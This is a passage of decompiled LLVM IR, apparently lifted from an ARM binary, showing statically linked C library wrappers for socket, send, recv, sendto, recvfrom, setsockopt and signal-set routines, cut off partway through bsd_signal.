  %v3_12e10 = load i16, i16* @global_var_23424.488, align 2
  %v4_12e10 = sext i16 %v3_12e10 to i32
  %v0_12e14 = load i32, i32* %r2.global-to-local, align 4
  %v1_12e14 = sub i32 0, %v0_12e14
  store i32 %v1_12e14, i32* %r2.global-to-local, align 4
  %v3_12e18 = add i32 %v4_12e10, %v0_12e0c
  %v4_12e18 = inttoptr i32 %v3_12e18 to i32*
  store i32 %v1_12e14, i32* %v4_12e18, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12e20.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12e20

dec_label_pc_12e20:                               ; preds = %entry, %dec_label_pc_12e08
  %v1_12e24 = phi i32 [ %v0_12df8, %entry ], [ -1, %dec_label_pc_12e08 ]
  %v2_12e20 = phi i32 [ %v3_12dec, %entry ], [ %v2_12e20.pre, %dec_label_pc_12e08 ]
  store i32 %v2_12e20, i32* @r7, align 4
  ret i32 %v1_12e24

; uselistorder directives
  uselistorder i32 %v0_12df8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12e20, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12e2c = load i32, i32* @r7, align 4
  store i32 %v3_12e2c, i32* %stack_var_-8, align 4
  %v0_12e38 = load i32, i32* @r0, align 4
  store i32 %v0_12e38, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12e38, -4095
  br i1 %tmp, label %dec_label_pc_12e60, label %dec_label_pc_12e48

dec_label_pc_12e48:                               ; preds = %entry
  %v0_12e4c = call i32 @__aeabi_read_tp()
  %v3_12e50 = load i16, i16* @global_var_23424.488, align 2
  %v4_12e50 = sext i16 %v3_12e50 to i32
  %v0_12e54 = load i32, i32* %r2.global-to-local, align 4
  %v1_12e54 = sub i32 0, %v0_12e54
  store i32 %v1_12e54, i32* %r2.global-to-local, align 4
  %v3_12e58 = add i32 %v4_12e50, %v0_12e4c
  %v4_12e58 = inttoptr i32 %v3_12e58 to i32*
  store i32 %v1_12e54, i32* %v4_12e58, align 4
  %v2_12e60.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12e60

dec_label_pc_12e60:                               ; preds = %entry, %dec_label_pc_12e48
  %v1_12e64 = phi i32 [ %v0_12e38, %entry ], [ -1, %dec_label_pc_12e48 ]
  %v2_12e60 = phi i32 [ %v3_12e2c, %entry ], [ %v2_12e60.pre, %dec_label_pc_12e48 ]
  store i32 %v2_12e60, i32* @r7, align 4
  ret i32 %v1_12e64

; uselistorder directives
  uselistorder i32 %v0_12e38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e60, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12e68:
  %v0_12e68 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12e68, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12e68
  %v2_12e6c = load i32, i32* @ip, align 4
  %v5_12e6c = sdiv i32 %v2_12e6c, 2048
  %v6_12e6c = and i32 %v5_12e6c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12e68, %bb
  %v7_12e6c = phi i32 [ %arg1, %dec_label_pc_12e68 ], [ %v6_12e6c, %bb ]
  ret i32 %v7_12e6c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12e74 = load i32, i32* @r4, align 4
  store i32 %v3_12e74, i32* %stack_var_-24, align 4
  %v6_12e74 = load i32, i32* @r5, align 4
  %v9_12e74 = load i32, i32* @r6, align 4
  %v12_12e74 = load i32, i32* @r7, align 4
  %v15_12e74 = load i32, i32* @r8, align 4
  %v18_12e74 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @ip, align 4
  %v4_12e80 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 13032) to i32*), align 4
  %v2_12e84 = icmp eq i32 %v4_12e80, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_12e84, label %dec_label_pc_12e9c, label %entry.dec_label_pc_12ea4_crit_edge

entry.dec_label_pc_12ea4_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12ea4

dec_label_pc_12e9c:                               ; preds = %entry
  store i32 %v3_12e74, i32* @r4, align 4
  store i32 %v9_12e74, i32* @r6, align 4
  store i32 %v12_12e74, i32* @r7, align 4
  store i32 %v15_12e74, i32* @r8, align 4
  %v0_12ea0 = call i32 @__sys_recv()
  br label %dec_label_pc_12ea4

dec_label_pc_12ea4:                               ; preds = %entry.dec_label_pc_12ea4_crit_edge, %dec_label_pc_12e9c
  %v0_12ea4 = call i32 @__libc_enable_asynccancel()
  %v0_12ea8 = load i32, i32* @r6, align 4
  store i32 %v0_12ea8, i32* @r1, align 4
  store i32 %v0_12ea4, i32* @r5, align 4
  %v0_12eb8 = load i32, i32* @r4, align 4
  store i32 %v0_12eb8, i32* @r0, align 4
  %v0_12ebc = call i32 @__sys_recv()
  store i32 %v0_12ebc, i32* @r4, align 4
  %v0_12ec4 = load i32, i32* @r5, align 4
  %v1_12ec8 = call i32 @__libc_disable_asynccancel(i32 %v0_12ec4)
  %v0_12ecc = load i32, i32* @r4, align 4
  %v2_12ed0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12ed0, i32* @r4, align 4
  store i32 %v6_12e74, i32* @r5, align 4
  store i32 %v9_12e74, i32* @r6, align 4
  store i32 %v12_12e74, i32* @r7, align 4
  store i32 %v15_12e74, i32* @r8, align 4
  store i32 %v18_12e74, i32* @lr, align 4
  ret i32 %v0_12ecc

; uselistorder directives
  uselistorder label %dec_label_pc_12ea4, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12ee0 = load i32, i32* @r4, align 4
  store i32 %v3_12ee0, i32* %stack_var_-16, align 4
  %v0_12ef4 = load i32, i32* @r0, align 4
  store i32 %v0_12ef4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12ef4, -4095
  br i1 %tmp, label %dec_label_pc_12f1c, label %dec_label_pc_12f04

dec_label_pc_12f04:                               ; preds = %entry
  %v0_12f08 = call i32 @__aeabi_read_tp()
  %v3_12f0c = load i16, i16* @global_var_23424.488, align 2
  %v4_12f0c = sext i16 %v3_12f0c to i32
  %v0_12f10 = load i32, i32* %r2.global-to-local, align 4
  %v1_12f10 = sub i32 0, %v0_12f10
  store i32 %v1_12f10, i32* %r2.global-to-local, align 4
  %v3_12f14 = add i32 %v4_12f0c, %v0_12f08
  %v4_12f14 = inttoptr i32 %v3_12f14 to i32*
  store i32 %v1_12f10, i32* %v4_12f14, align 4
  %v2_12f1c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_12f1c

dec_label_pc_12f1c:                               ; preds = %entry, %dec_label_pc_12f04
  %v1_12f20 = phi i32 [ %v0_12ef4, %entry ], [ -1, %dec_label_pc_12f04 ]
  %v2_12f1c = phi i32 [ %v3_12ee0, %entry ], [ %v2_12f1c.pre, %dec_label_pc_12f04 ]
  store i32 %v2_12f1c, i32* @r4, align 4
  ret i32 %v1_12f20

; uselistorder directives
  uselistorder i32 %v0_12ef4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f1c, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12f28 = load i32, i32* @r4, align 4
  store i32 %v3_12f28, i32* %stack_var_-32, align 4
  %v6_12f28 = load i32, i32* @r5, align 4
  %v9_12f28 = load i32, i32* @r6, align 4
  %v12_12f28 = load i32, i32* @r7, align 4
  %v15_12f28 = load i32, i32* @r8, align 4
  %v18_12f28 = load i32, i32* @sb, align 4
  %v21_12f28 = load i32, i32* @sl, align 4
  %v24_12f28 = load i32, i32* @lr, align 4
  %v4_12f38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 13032) to i32*), align 4
  %v2_12f40 = icmp eq i32 %v4_12f38, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_12f40, label %dec_label_pc_12f60, label %dec_label_pc_12f6c

dec_label_pc_12f60:                               ; preds = %entry
  store i32 %v3_12f28, i32* @r4, align 4
  store i32 %v12_12f28, i32* @r7, align 4
  store i32 %v15_12f28, i32* @r8, align 4
  store i32 %v18_12f28, i32* %sb.global-to-local, align 4
  %v0_12f68 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_12f6c

dec_label_pc_12f6c:                               ; preds = %entry, %dec_label_pc_12f60
  %v0_12f6c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12f6c, i32* @r5, align 4
  %v0_12f80 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12f80, i32* @r0, align 4
  %v0_12f88 = call i32 @__sys_recvfrom()
  store i32 %v0_12f88, i32* @r4, align 4
  %v0_12f90 = load i32, i32* @r5, align 4
  %v1_12f94 = call i32 @__libc_disable_asynccancel(i32 %v0_12f90)
  %v0_12f98 = load i32, i32* @r4, align 4
  %v2_12fa0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12fa0, i32* @r4, align 4
  store i32 %v6_12f28, i32* @r5, align 4
  store i32 %v9_12f28, i32* @r6, align 4
  store i32 %v12_12f28, i32* @r7, align 4
  store i32 %v15_12f28, i32* @r8, align 4
  store i32 %v18_12f28, i32* @sb, align 4
  store i32 %v21_12f28, i32* @sl, align 4
  store i32 %v24_12f28, i32* @lr, align 4
  ret i32 %v0_12f98

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f6c, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12fb0 = load i32, i32* @r7, align 4
  store i32 %v3_12fb0, i32* %stack_var_-8, align 4
  %v0_12fbc = load i32, i32* @r0, align 4
  store i32 %v0_12fbc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12fbc, -4095
  br i1 %tmp, label %dec_label_pc_12fe4, label %dec_label_pc_12fcc

dec_label_pc_12fcc:                               ; preds = %entry
  %v0_12fd0 = call i32 @__aeabi_read_tp()
  %v3_12fd4 = load i16, i16* @global_var_23424.488, align 2
  %v4_12fd4 = sext i16 %v3_12fd4 to i32
  store i32 %v4_12fd4, i32* @r3, align 4
  %v0_12fd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_12fd8 = sub i32 0, %v0_12fd8
  store i32 %v1_12fd8, i32* %r2.global-to-local, align 4
  %v3_12fdc = add i32 %v4_12fd4, %v0_12fd0
  %v4_12fdc = inttoptr i32 %v3_12fdc to i32*
  store i32 %v1_12fd8, i32* %v4_12fdc, align 4
  %v2_12fe4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12fe4

dec_label_pc_12fe4:                               ; preds = %entry, %dec_label_pc_12fcc
  %v1_12fe8 = phi i32 [ %v0_12fbc, %entry ], [ -1, %dec_label_pc_12fcc ]
  %v2_12fe4 = phi i32 [ %v3_12fb0, %entry ], [ %v2_12fe4.pre, %dec_label_pc_12fcc ]
  store i32 %v2_12fe4, i32* @r7, align 4
  ret i32 %v1_12fe8

; uselistorder directives
  uselistorder i32 %v0_12fbc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12fe4, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12fec:
  %v0_12fec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12fec, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12fec
  %v2_12ff0 = load i32, i32* @r8, align 4
  %v5_12ff0 = sdiv i32 %v2_12ff0, 256
  %v6_12ff0 = and i32 %v5_12ff0, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12fec, %bb
  %v7_12ff0 = phi i32 [ %arg1, %dec_label_pc_12fec ], [ %v6_12ff0, %bb ]
  ret i32 %v7_12ff0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12ff8 = load i32, i32* @r4, align 4
  store i32 %v3_12ff8, i32* %stack_var_-24, align 4
  %v6_12ff8 = load i32, i32* @r5, align 4
  %v9_12ff8 = load i32, i32* @r6, align 4
  %v12_12ff8 = load i32, i32* @r7, align 4
  %v15_12ff8 = load i32, i32* @r8, align 4
  %v18_12ff8 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @ip, align 4
  %v4_13004 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 13032) to i32*), align 4
  %v2_13008 = icmp eq i32 %v4_13004, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_13008, label %dec_label_pc_13020, label %entry.dec_label_pc_13028_crit_edge

entry.dec_label_pc_13028_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13028

dec_label_pc_13020:                               ; preds = %entry
  store i32 %v3_12ff8, i32* @r4, align 4
  store i32 %v9_12ff8, i32* @r6, align 4
  store i32 %v12_12ff8, i32* @r7, align 4
  store i32 %v15_12ff8, i32* @r8, align 4
  %v0_13024 = call i32 @__sys_send()
  br label %dec_label_pc_13028

dec_label_pc_13028:                               ; preds = %entry.dec_label_pc_13028_crit_edge, %dec_label_pc_13020
  %v0_13028 = call i32 @__libc_enable_asynccancel()
  %v0_1302c = load i32, i32* @r6, align 4
  store i32 %v0_1302c, i32* @r1, align 4
  store i32 %v0_13028, i32* @r5, align 4
  %v0_13038 = load i32, i32* @r8, align 4
  store i32 %v0_13038, i32* @r3, align 4
  %v0_1303c = load i32, i32* @r4, align 4
  store i32 %v0_1303c, i32* @r0, align 4
  %v0_13040 = call i32 @__sys_send()
  store i32 %v0_13040, i32* @r4, align 4
  %v0_13048 = load i32, i32* @r5, align 4
  %v1_1304c = call i32 @__libc_disable_asynccancel(i32 %v0_13048)
  %v0_13050 = load i32, i32* @r4, align 4
  %v2_13054 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13054, i32* @r4, align 4
  store i32 %v6_12ff8, i32* @r5, align 4
  store i32 %v9_12ff8, i32* @r6, align 4
  store i32 %v12_12ff8, i32* @r7, align 4
  store i32 %v15_12ff8, i32* @r8, align 4
  store i32 %v18_12ff8, i32* @lr, align 4
  ret i32 %v0_13050

; uselistorder directives
  uselistorder label %dec_label_pc_13028, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13064 = load i32, i32* @r4, align 4
  store i32 %v3_13064, i32* %stack_var_-16, align 4
  %v0_13078 = load i32, i32* @r0, align 4
  store i32 %v0_13078, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13078, -4095
  br i1 %tmp, label %dec_label_pc_130a0, label %dec_label_pc_13088

dec_label_pc_13088:                               ; preds = %entry
  %v0_1308c = call i32 @__aeabi_read_tp()
  %v3_13090 = load i16, i16* @global_var_23424.488, align 2
  %v4_13090 = sext i16 %v3_13090 to i32
  %v0_13094 = load i32, i32* %r2.global-to-local, align 4
  %v1_13094 = sub i32 0, %v0_13094
  store i32 %v1_13094, i32* %r2.global-to-local, align 4
  %v3_13098 = add i32 %v4_13090, %v0_1308c
  %v4_13098 = inttoptr i32 %v3_13098 to i32*
  store i32 %v1_13094, i32* %v4_13098, align 4
  %v2_130a0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_130a0

dec_label_pc_130a0:                               ; preds = %entry, %dec_label_pc_13088
  %v1_130a4 = phi i32 [ %v0_13078, %entry ], [ -1, %dec_label_pc_13088 ]
  %v2_130a0 = phi i32 [ %v3_13064, %entry ], [ %v2_130a0.pre, %dec_label_pc_13088 ]
  store i32 %v2_130a0, i32* @r4, align 4
  ret i32 %v1_130a4

; uselistorder directives
  uselistorder i32 %v0_13078, { 1, 0, 2 }
  uselistorder label %dec_label_pc_130a0, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_130a8:
  %v0_130a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_130a8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_130a8
  %v2_130ac = load i32, i32* @ip, align 4
  %v5_130ac = mul i32 %v2_130ac, 128
  %v6_130ac = and i32 %v5_130ac, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_130a8, %bb
  %v7_130ac = phi i32 [ %arg1, %dec_label_pc_130a8 ], [ %v6_130ac, %bb ]
  ret i32 %v7_130ac

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_130b0 = load i32, i32* @r4, align 4
  store i32 %v3_130b0, i32* %stack_var_-32, align 4
  %v6_130b0 = load i32, i32* @r5, align 4
  %v9_130b0 = load i32, i32* @r6, align 4
  %v12_130b0 = load i32, i32* @r7, align 4
  %v15_130b0 = load i32, i32* @r8, align 4
  %v18_130b0 = load i32, i32* @sb, align 4
  %v21_130b0 = load i32, i32* @sl, align 4
  %v24_130b0 = load i32, i32* @lr, align 4
  %v4_130c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 13032) to i32*), align 4
  %v2_130c8 = icmp eq i32 %v4_130c0, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_130c8, label %dec_label_pc_130e8, label %dec_label_pc_130f4

dec_label_pc_130e8:                               ; preds = %entry
  store i32 %v3_130b0, i32* @r4, align 4
  store i32 %v12_130b0, i32* @r7, align 4
  store i32 %v15_130b0, i32* @r8, align 4
  store i32 %v18_130b0, i32* %sb.global-to-local, align 4
  %v0_130f0 = call i32 @__sys_sendto()
  br label %dec_label_pc_130f4

dec_label_pc_130f4:                               ; preds = %entry, %dec_label_pc_130e8
  %v0_130f4 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_130f4, i32* @r5, align 4
  %v0_13108 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_13108, i32* @r0, align 4
  %v0_13110 = call i32 @__sys_sendto()
  store i32 %v0_13110, i32* @r4, align 4
  %v0_13118 = load i32, i32* @r5, align 4
  %v1_1311c = call i32 @__libc_disable_asynccancel(i32 %v0_13118)
  %v0_13120 = load i32, i32* @r4, align 4
  %v2_13128 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_13128, i32* @r4, align 4
  store i32 %v6_130b0, i32* @r5, align 4
  store i32 %v9_130b0, i32* @r6, align 4
  store i32 %v12_130b0, i32* @r7, align 4
  store i32 %v15_130b0, i32* @r8, align 4
  store i32 %v18_130b0, i32* @sb, align 4
  store i32 %v21_130b0, i32* @sl, align 4
  store i32 %v24_130b0, i32* @lr, align 4
  ret i32 %v0_13120

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_130f4, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13138 = load i32, i32* @r4, align 4
  store i32 %v3_13138, i32* %stack_var_-12, align 4
  %v0_13148 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13148, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13148, -4095
  br i1 %tmp, label %dec_label_pc_13170, label %dec_label_pc_13158

dec_label_pc_13158:                               ; preds = %entry
  %v0_1315c = call i32 @__aeabi_read_tp()
  %v3_13160 = load i16, i16* @global_var_23424.488, align 2
  %v4_13160 = sext i16 %v3_13160 to i32
  store i32 %v4_13160, i32* @r3, align 4
  %v0_13164 = load i32, i32* %r2.global-to-local, align 4
  %v1_13164 = sub i32 0, %v0_13164
  store i32 %v1_13164, i32* %r2.global-to-local, align 4
  %v3_13168 = add i32 %v4_13160, %v0_1315c
  %v4_13168 = inttoptr i32 %v3_13168 to i32*
  store i32 %v1_13164, i32* %v4_13168, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13170.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13170

dec_label_pc_13170:                               ; preds = %entry, %dec_label_pc_13158
  %v1_13174 = phi i32 [ %v0_13148, %entry ], [ -1, %dec_label_pc_13158 ]
  %v2_13170 = phi i32 [ %v3_13138, %entry ], [ %v2_13170.pre, %dec_label_pc_13158 ]
  store i32 %v2_13170, i32* @r4, align 4
  ret i32 %v1_13174

; uselistorder directives
  uselistorder i32 %v0_13148, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13170, { 1, 0 }
}

define i32 @"$d.1"(i16 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13178:
  %r0.global-to-local = alloca i32, align 4
  %tmp = sext i16 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_13178 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13178, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13178
  %tmp2 = inttoptr i32 %arg2 to i16*
  %v2_13178 = load i32, i32* @r6, align 4
  %v5_13178 = udiv i32 %v2_13178, 4
  %v6_13178 = and i32 %v5_13178, %tmp
  store i32 %v6_13178, i32* %r0.global-to-local, align 4
  %v2_1317c = trunc i32 %v6_13178 to i16
  store i16 %v2_1317c, i16* %tmp2, align 2
  %v10_1317c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13178, %bb
  %v10_1317c = phi i32 [ %tmp, %dec_label_pc_13178 ], [ %v10_1317c.pre, %bb ]
  ret i32 %v10_1317c

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13180 = load i32, i32* @r7, align 4
  store i32 %v3_13180, i32* %stack_var_-8, align 4
  %v0_1318c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1318c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1318c, -4095
  br i1 %tmp, label %dec_label_pc_131b4, label %dec_label_pc_1319c

dec_label_pc_1319c:                               ; preds = %entry
  %v0_131a0 = call i32 @__aeabi_read_tp()
  %v3_131a4 = load i16, i16* @global_var_23424.488, align 2
  %v4_131a4 = sext i16 %v3_131a4 to i32
  store i32 %v4_131a4, i32* @r3, align 4
  %v0_131a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_131a8 = sub i32 0, %v0_131a8
  store i32 %v1_131a8, i32* %r2.global-to-local, align 4
  %v3_131ac = add i32 %v4_131a4, %v0_131a0
  %v4_131ac = inttoptr i32 %v3_131ac to i32*
  store i32 %v1_131a8, i32* %v4_131ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_131b4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_131b4

dec_label_pc_131b4:                               ; preds = %entry, %dec_label_pc_1319c
  %v1_131b8 = phi i32 [ %v0_1318c, %entry ], [ -1, %dec_label_pc_1319c ]
  %v2_131b4 = phi i32 [ %v3_13180, %entry ], [ %v2_131b4.pre, %dec_label_pc_1319c ]
  store i32 %v2_131b4, i32* @r7, align 4
  ret i32 %v1_131b8

; uselistorder directives
  uselistorder i32 %v0_1318c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_131b4, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_131bc:
  %v0_131bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_131bc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_131bc
  %v2_131c0 = load i32, i32* @r8, align 4
  %v4_131c0 = lshr i32 %v2_131c0, %arg3
  %v5_131c0 = sub i32 32, %arg3
  %v6_131c0 = shl i32 %v2_131c0, %v5_131c0
  %v7_131c0 = or i32 %v6_131c0, %v4_131c0
  %v9_131c0 = and i32 %v7_131c0, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_131bc, %bb
  %v10_131c0 = phi i32 [ %arg1, %dec_label_pc_131bc ], [ %v9_131c0, %bb ]
  ret i32 %v10_131c0

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_131dc, label %dec_label_pc_131d4

dec_label_pc_131d4:                               ; preds = %entry
  %v7_131d8 = icmp slt i32 %arg1, 65
  br i1 %v7_131d8, label %dec_label_pc_131f8, label %dec_label_pc_131dc

dec_label_pc_131dc:                               ; preds = %dec_label_pc_131d4, %entry
  %v0_131e0 = call i32 @__aeabi_read_tp()
  %v3_131e4 = load i16, i16* @global_var_23424.488, align 2
  %v4_131e4 = sext i16 %v3_131e4 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_131f0 = add i32 %v4_131e4, %v0_131e0
  %v4_131f0 = inttoptr i32 %v3_131f0 to i32*
  store i32 22, i32* %v4_131f0, align 4
  %v0_13200.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13200

dec_label_pc_131f8:                               ; preds = %dec_label_pc_131d4
  %v0_131f8 = call i32 @__sigaddset()
  store i32 %v0_131f8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13200

dec_label_pc_13200:                               ; preds = %dec_label_pc_131dc, %dec_label_pc_131f8
  %v0_13200 = phi i32 [ %v0_13200.pre, %dec_label_pc_131dc ], [ %v0_131f8, %dec_label_pc_131f8 ]
  ret i32 %v0_13200

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13200, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1321c = add i32 %tmp, 4
  %v3_1321c = inttoptr i32 %v2_1321c to i32*
  store i32 0, i32* %v3_1321c, align 4
  %v1_13220 = load i32, i32* %r3.global-to-local, align 4
  %v2_13220 = inttoptr i32 %v1_13220 to i32*
  store i32 0, i32* %v2_13220, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13228 = load i32, i32* @r4, align 4
  store i32 %v3_13228, i32* %stack_var_-16, align 4
  %v6_13228 = load i32, i32* @r5, align 4
  %v9_13228 = load i32, i32* @r6, align 4
  %v7_13230 = icmp eq i32 %arg2, -1
  br i1 %v7_13230, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_13238 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_13254

.thread16:                                        ; preds = %bb, %.thread4
